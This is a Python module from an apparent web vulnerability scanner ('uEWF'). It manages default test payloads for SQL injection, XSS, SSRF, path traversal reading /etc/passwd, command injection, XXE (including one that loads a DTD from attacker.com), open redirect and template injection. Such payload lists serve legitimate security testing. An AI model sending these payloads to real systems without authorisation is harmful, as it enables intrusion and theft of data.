"""
Payload management module for uEWF.
Manages test payloads for various vulnerability types.
"""

import json
import os
from typing import List, Dict, Optional
from pathlib import Path

from ..core.logger import get_logger
from ..core.config import Config

logger = get_logger(__name__)


class PayloadManager:
    """Manages payloads for security testing."""
    
    def __init__(self):
        self.payloads = {
            'sqli': [],
            'xss': [],
            'ssrf': [],
            'lfi': [],
            'command_injection': [],
            'xxe': [],
            'open_redirect': [],
            'template_injection': [],
        }
        self._load_payloads()
    
    def _load_payloads(self):
        """Load payloads from data files and defaults."""
        # Load from data directory
        data_dir = Path(__file__).parent.parent / 'data' / 'payloads'
        if data_dir.exists():
            for payload_file in data_dir.glob('*.json'):
                try:
                    with open(payload_file) as f:
                        data = json.load(f)
                        for vuln_type, payloads in data.items():
                            if vuln_type in self.payloads:
                                self.payloads[vuln_type].extend(payloads)
                except Exception as e:
                    logger.warning(f"Failed to load payloads from {payload_file}: {e}")
        
        # Load default payloads if data files are empty
        for vuln_type in self.payloads:
            if not self.payloads[vuln_type]:
                self._load_default_payloads(vuln_type)
    
    def load_default_payloads(self):
        """Load default payloads for all vulnerability types."""
        for vuln_type in self.payloads:
            self._load_default_payloads(vuln_type)
    
    def _load_default_payloads(self, vuln_type: str):
        """Load default payloads for a specific vulnerability type."""
        if vuln_type == 'sqli':
            self.payloads['sqli'] = [
                "'",
                "\"",
                "')",
                "'))",
                "1' OR '1'='1",
                "1' OR '1'='1' --",
                "1' OR '1'='1' #",
                "1' OR 1=1 --",
                "1' OR 1=1 #",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR 1=1 --",
                "' OR 1=1 #",
                "\" OR \"1\"=\"1",
                "\" OR \"1\"=\"1\" --",
                "\" OR 1=1 --",
                "1' AND 1=1 --",
                "1' AND 1=2 --",
                "' AND '1'='1",
                "' AND '1'='2",
                "1' ORDER BY 1 --",
                "1' ORDER BY 2 --",
                "1' ORDER BY 3 --",
                "1' UNION SELECT NULL --",
                "1' UNION SELECT NULL,NULL --",
                "1' UNION SELECT NULL,NULL,NULL --",
                "' UNION SELECT 1 --",
                "' UNION SELECT 1,2 --",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT @@version --",
                "' UNION SELECT database() --",
                "' UNION SELECT user() --",
                "1' AND SLEEP(5) --",
                "1' AND SLEEP(5) #",
                "1' AND PG_SLEEP(5) --",
                "1' WAITFOR DELAY '0:0:5' --",
            ]
        
        elif vuln_type == 'xss':
            self.payloads['xss'] = [
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert(1)>",
                "<svg/onload=alert('XSS')>",
                "<body onload=alert(1)>",
                "<input autofocus onfocus=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<select autofocus onfocus=alert(1)>",
                "<textarea autofocus onfocus=alert(1)>",
                "<keygen autofocus onfocus=alert(1)>",
                "<iframe onload=alert(1)>",
                "<a href=javascript:alert(1)>click</a>",
                "\" onmouseover=alert(1) \"",
                "' onmouseover=alert(1) '",
                "javascript:alert(1)",
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                "%253Cscript%253Ealert(1)%253C/script%253E",
                "<<script>alert(1)</script>",
                "<SCRIPT>alert(1)</SCRIPT>",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<script>alert`1`</script>",
            ]
        
        elif vuln_type == 'ssrf':
            self.payloads['ssrf'] = [
                "http://127.0.0.1:80",
                "http://127.0.0.1:8080",
                "http://localhost:80",
                "http://localhost:8080",
                "http://[::1]:80",
                "http://[::1]:8080",
                "http://0.0.0.0:80",
                "http://0.0.0.0:8080",
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "gopher://127.0.0.1:6379/_",
                "dict://127.0.0.1:6379/info",
            ]
        
        elif vuln_type == 'lfi':
            self.payloads['lfi'] = [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "../../../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "../../../etc/passwd%00",
                "../../../etc/passwd%2500",
                "....//....//....//etc/passwd%00",
                "/etc/passwd",
                "../../../windows/win.ini",
                "../../../../windows/win.ini",
            ]
        
        elif vuln_type == 'command_injection':
            self.payloads['command_injection'] = [
                "; id",
                "| id",
                "|| id",
                "& id",
                "&& id",
                "`id`",
                "$(id)",
                "; ls -la",
                "| ls -la",
                "& dir",
                "| dir",
            ]
        
        elif vuln_type == 'xxe':
            self.payloads['xxe'] = [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">%ext;]><root/>',
            ]
        
        elif vuln_type == 'open_redirect':
            self.payloads['open_redirect'] = [
                "//evil.com",
                "//evil.com/",
                "/\\evil.com",
                "https://evil.com",
                "http://evil.com",
                "//evil.com@good.com",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
            ]
        
        elif vuln_type == 'template_injection':
            self.payloads['template_injection'] = [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{self}}",
                "${7*'7'}",
                "#{7*7}",
                "*{7*7}",
            ]
    
    def get_payloads(self, vuln_type: str, limit: int = None) -> List[str]:
        """Get payloads for a vulnerability type."""
        payloads = self.payloads.get(vuln_type, [])
        if limit:
            return payloads[:limit]
        return payloads
    
    def get_all_payloads(self) -> Dict[str, List[str]]:
        """Get all payloads."""
        return self.payloads
    
    def add_payload(self, vuln_type: str, payload: str):
        """Add a new payload."""
        if vuln_type in self.payloads:
            if payload not in self.payloads[vuln_type]:
                self.payloads[vuln_type].append(payload)
                logger.debug(f"Added payload to {vuln_type}: {payload[:50]}")
    
    def remove_payload(self, vuln_type: str, payload: str):
        """Remove a payload."""
        if vuln_type in self.payloads:
            self.payloads[vuln_type] = [p for p in self.payloads[vuln_type] if p != payload]
    
    def get_payload_count(self, vuln_type: str = None) -> int:
        """Get total number of payloads."""
        if vuln_type:
            return len(self.payloads.get(vuln_type, []))
        return sum(len(p) for p in self.payloads.values())
    
    def search_payloads(self, query: str) -> Dict[str, List[str]]:
        """Search payloads by keyword."""
        results = {}
        query = query.lower()
        
        for vuln_type, payloads in self.payloads.items():
            matching = [p for p in payloads if query in p.lower()]
            if matching:
                results[vuln_type] = matching
        
        return results
    
    def save_payloads(self, vuln_type: str = None):
        """Save payloads to JSON files."""
        data_dir = Path(__file__).parent.parent / 'data' / 'payloads'
        data_dir.mkdir(parents=True, exist_ok=True)
        
        if vuln_type:
            filename = f"{vuln_type}_payloads.json"
            filepath = data_dir / filename
            with open(filepath, 'w') as f:
                json.dump({vuln_type: self.payloads[vuln_type]}, f, indent=2)
        else:
            for vtype, payloads in self.payloads.items():
                filename = f"{vtype}_payloads.json"
                filepath = data_dir / filename
                with open(filepath, 'w') as f:
                    json.dump({vtype: payloads}, f, indent=2)
        
        logger.info(f"Payloads saved to {data_dir}")

